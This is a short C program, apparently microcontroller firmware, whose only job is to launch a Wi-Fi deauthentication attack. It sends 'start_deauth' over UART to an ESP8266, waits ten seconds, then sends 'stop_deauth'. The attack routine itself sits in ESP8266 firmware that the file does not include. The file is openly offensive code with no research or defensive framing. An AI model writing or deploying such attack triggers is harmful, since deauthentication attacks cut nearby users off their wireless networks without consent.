#include <gpio.h>
#include <uart.h>

// Pins for UART communication
#define UART_TX_PIN GPIO_PIN_10
#define UART_RX_PIN GPIO_PIN_9

void start_deauth_attack() {
    // Initialize UART
    uart_init(UART_BAUDRATE_115200);
    gpio_set_mode(UART_TX_PIN, GPIO_MODE_OUTPUT);
    gpio_set_mode(UART_RX_PIN, GPIO_MODE_INPUT);

    // Send command to ESP8266 to start deauth attack
    uart_write("start_deauth\n", 13);

    // Delay for 10 seconds
    delay_ms(10000);

    // Send command to stop deauth attack
    uart_write("stop_deauth\n", 12);

    // Deinitialize UART
    uart_deinit();
}

int main() {
    start_deauth_attack();
    return 0;
}
